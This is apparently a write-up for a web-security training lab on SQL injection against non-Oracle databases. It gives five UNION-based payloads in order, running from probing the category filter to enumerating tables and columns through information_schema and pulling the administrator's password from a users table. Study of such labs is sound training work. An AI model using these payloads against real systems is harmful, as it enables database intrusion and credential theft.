Title: SQL injection attack, listing the database contents on non-Oracle databases
Level: Practitioner
Desc:  This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
To solve the lab, log in as the administrator user. 

payload: `category=Gifts' OR 1=1--`
![image](https://github.com/user-attachments/assets/92a71cbb-b529-4ecc-9afb-3c7b0d3b763b)

payload: `category=Gifts' OR 1=1 UNION SELECT '1','2'--`
![image](https://github.com/user-attachments/assets/3ef4a6ce-ddc1-4e9f-aee8-26168273423b)

payload: `category=Gifts' OR 1=1 UNION SELECT '1',table_name FROM information_schema.tables--`
![image](https://github.com/user-attachments/assets/a166142f-2eb3-459c-83a4-17db20d38a5a)

table name: users_ieskuv

payload: `category=Gifts' OR 1=1 UNION SELECT '1',column_name FROM information_schema.columns where table_name='users_ieskuv'--`
![image](https://github.com/user-attachments/assets/6c584bf6-0431-49a6-aeac-71529fb290fa)

columns: username_jdwuic, password_hgdlmz

payload: `category=Gifts' OR 1=1 UNION SELECT '1',password_hgdlmz FROM users_ieskuv where username_jdwuic='administrator'--`
![image](https://github.com/user-attachments/assets/163b793f-fdab-4f66-911e-9d90944d1b35)
